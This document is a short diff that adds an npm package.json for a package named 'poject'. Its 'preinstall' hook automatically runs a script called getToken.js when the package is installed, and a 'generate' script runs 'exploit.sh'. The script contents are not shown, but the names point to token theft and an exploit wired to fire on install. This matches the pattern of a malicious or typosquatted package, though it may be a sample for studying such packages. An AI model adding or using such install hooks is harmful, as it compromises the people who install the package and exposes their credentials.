@@ -1,0 +1,8 @@
+{
+  "name": "poject",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node getToken.js",
+    "generate": "bash ./exploit.sh"
+  }
+}
